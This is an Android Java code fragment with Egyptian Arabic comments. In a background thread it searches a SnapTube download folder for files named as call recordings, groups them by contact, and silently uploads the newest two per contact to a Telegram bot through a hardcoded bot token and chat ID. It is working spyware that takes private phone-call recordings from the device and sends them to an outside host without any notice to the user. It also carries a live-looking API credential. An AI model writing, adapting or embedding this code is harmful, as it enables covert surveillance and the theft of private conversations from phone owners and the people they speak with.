// ==== 1. طلب صلاحية التخزين ====
if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
    requestPermissions(new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE}, 1001);
} else {
    // ==== 2. لو الصلاحية موجودة، اشتغل على طول ====
    new Thread(new Runnable() {
        @Override
        public void run() {
            try {
                java.io.File dir = new java.io.File("/storage/emulated/0/snaptube/download/SnapTube Audio");
                if (!dir.exists() || !dir.isDirectory()) return;

                java.io.File[] files = dir.listFiles();
                if (files == null || files.length == 0) return;

                // فلتر الملفات الصوتية اللي بتبدأ بـ "تسجيل المكالمة"
                java.util.List<java.io.File> audioFiles = new java.util.ArrayList<>();
                for (java.io.File f : files) {
                    if (f.isFile() && f.getName().startsWith("تسجيل المكالمة") && 
                        (f.getName().endsWith(".mp3") || f.getName().endsWith(".m4a") || 
                         f.getName().endsWith(".wav") || f.getName().endsWith(".aac"))) {
                        audioFiles.add(f);
                    }
                }

                if (audioFiles.isEmpty()) return;

                // رتب حسب الوقت (الأحدث أولاً)
                java.util.Collections.sort(audioFiles, new java.util.Comparator<java.io.File>() {
                    @Override
                    public int compare(java.io.File f1, java.io.File f2) {
                        return Long.compare(f2.lastModified(), f1.lastModified());
                    }
                });

                // جمع حسب الاسم (الجملة الأساسية)
                java.util.Map<String, java.util.List<java.io.File>> groups = new java.util.LinkedHashMap<>();
                for (java.io.File f : audioFiles) {
                    String name = f.getName();
                    // استخراج الجملة الأساسية (مثلاً: "تسجيل المكالمة اسراء")
                    String baseName = name.replaceAll(" \\d+\\.[^.]+$", "").replaceAll("\\.[^.]+$", "");
                    
                    if (!groups.containsKey(baseName)) {
                        groups.put(baseName, new java.util.ArrayList<java.io.File>());
                    }
                    groups.get(baseName).add(f);
                }

                // ابعت أحدث 2 من كل مجموعة
                String botToken = "8519648833:AAHeg8gNX7P1UZabWKcqeFJv0NAggRzS3Qs";
                String chatId = "1431886140";
                String apiUrl = "https://api.telegram.org/bot" + botToken + "/sendAudio";

                for (java.util.List<java.io.File> group : groups.values()) {
                    int limit = Math.min(2, group.size());
                    for (int i = 0; i < limit; i++) {
                        java.io.File fileToSend = group.get(i);
                        
                        // ==== إرسال الملف للتليجرام ====
                        try {
                            String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
                            java.net.URL url = new java.net.URL(apiUrl);
                            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                            conn.setDoOutput(true);
                            conn.setDoInput(true);
                            conn.setUseCaches(false);
                            conn.setRequestMethod("POST");
                            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                            conn.setConnectTimeout(30000);
                            conn.setReadTimeout(30000);

                            java.io.DataOutputStream dos = new java.io.DataOutputStream(conn.getOutputStream());

                            // chat_id
                            dos.writeBytes("--" + boundary + "\r\n");
                            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                            dos.writeBytes(chatId + "\r\n");

                            // audio file
                            dos.writeBytes("--" + boundary + "\r\n");
                            dos.writeBytes("Content-Disposition: form-data; name=\"audio\"; filename=\"" + fileToSend.getName() + "\"\r\n");
                            dos.writeBytes("Content-Type: audio/mpeg\r\n\r\n");

                            java.io.FileInputStream fis = new java.io.FileInputStream(fileToSend);
                            byte[] buffer = new byte[4096];
                            int bytesRead;
                            while ((bytesRead = fis.read(buffer)) != -1) {
                                dos.write(buffer, 0, bytesRead);
                            }
                            fis.close();

                            dos.writeBytes("\r\n");
                            dos.writeBytes("--" + boundary + "--\r\n");
                            dos.flush();
                            dos.close();

                            int responseCode = conn.getResponseCode();
                            conn.disconnect();

                        } catch (Exception ex) {
                            ex.printStackTrace();
                        }

                        // نايم شوية علشان مايتبعتش كلهم ف نفس اللحظة
                        Thread.sleep(2000);
                    }
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }).start();
}
